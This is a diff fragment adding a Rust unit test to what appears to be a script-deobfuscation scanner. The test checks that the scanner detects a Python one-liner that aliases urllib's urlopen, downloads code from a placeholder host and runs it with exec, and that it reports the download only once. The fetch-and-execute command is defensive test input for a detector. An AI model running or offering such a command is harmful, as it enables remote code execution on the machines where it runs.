@@ -11440,6 +11440,38 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_urllib_assigned_urlopen_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; fetch = urllib.request.urlopen; exec(fetch('https://py.example/assigned-urlopen').read())""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/assigned-urlopen" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned urllib urlopen alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-urlopen")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned urllib urlopen alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_urlretrieve_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
